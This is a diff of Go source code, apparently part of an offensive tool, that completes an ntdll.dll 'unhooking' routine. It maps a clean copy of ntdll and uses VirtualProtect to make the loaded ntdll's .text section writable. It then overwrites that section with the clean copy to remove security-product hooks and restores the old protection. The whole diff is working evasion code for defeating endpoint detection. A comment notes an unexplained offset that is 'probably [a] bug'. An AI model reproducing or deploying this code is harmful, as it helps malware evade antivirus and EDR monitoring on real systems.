@@ -61,20 +61,41 @@ func main() {
 	fmt.Printf("[+] Iterating over number of sections: %d\n", ntdllHeader.FileHeader.NumberOfSections)
 	for i := uint32(0); i < uint32(ntdllHeader.FileHeader.NumberOfSections); i++ {
 		sectionHeader := (*PIMAGE_SECTION_HEADER)(unsafe.Pointer(uintptr(unsafe.Pointer(IMAGE_FIRST_SECTION(ntdllHeader))) + uintptr(IMAGE_SIZEOF_SECTION_HEADER*i) + uintptr(4))) // add 4 - probably bug somewhere earlier, it sets padding correctly
-		fmt.Printf("[+] Processed section address: %x\n", unsafe.Pointer(sectionHeader))
-
-		fmt.Printf("[+] Processed section name: %s\n", string(sectionHeader.Name[:]))
-		fmt.Printf("[+] Processed section name: %x\n", sectionHeader.Name)
+		//fmt.Printf("[+] Processed section address: %x\n", unsafe.Pointer(sectionHeader))
+		//fmt.Printf("[+] Processed section name: %s\n", string(sectionHeader.Name[:]))
 
 		if strings.HasPrefix(string(sectionHeader.Name[:]), ".text") {
 			fmt.Printf("[+] Found .text section at address: %x\n", unsafe.Pointer(sectionHeader))
+			var oldProtection uint32 = 0
+			DST_lpAddress := modinfo.BaseOfDll + uintptr(sectionHeader.VirtualAddress)
+			fmt.Printf("[+] Changing protection of memory region.\n")
+			fmt.Printf("[+] Destination address: %x\n", DST_lpAddress)
+			isProtected := VirtualProtect(DST_lpAddress, sectionHeader.VirtualSize, syscall.PAGE_EXECUTE_READWRITE, &oldProtection)
+			if !isProtected {
+				fmt.Println("[!] Could not change memory protection, aborting...")
+				return
+			}
+			fmt.Printf("[+] VirtualProtect result: %t\n", isProtected)
+			fmt.Printf("[+] Old protection: %d\n", oldProtection)
 
+			fmt.Printf("[+] Copying .text section from the freshly mapped dll to (virtAddr) hooked ntdll.dll.\n")
+			SRC_lpAddress := viewOfFilePtr + uintptr(sectionHeader.VirtualAddress)
+			fmt.Printf("[+] Source address: %x\n", SRC_lpAddress)
+			CopyMemory(DST_lpAddress, SRC_lpAddress, sectionHeader.VirtualSize)
+
+			fmt.Printf("[+] Setting back old memory protection.\n")
+			isProtected = VirtualProtect(DST_lpAddress, sectionHeader.VirtualSize, oldProtection, &oldProtection)
+			if !isProtected {
+				fmt.Println("[!] Could not change memory protection to its previous state, aborting...")
+				return
+			}
 		}
 	}
 
 	CloseHandle(hNtdllFile)
 	CloseHandle(hNtdllFileMapping)
 	CloseHandle(hProcess)
+	fmt.Printf("[+] DLL unhooking completed.\n")
 }
 
 func IMAGE_FIRST_SECTION(ntheader *PIMAGE_NT_HEADERS) *PIMAGE_SECTION_HEADER {
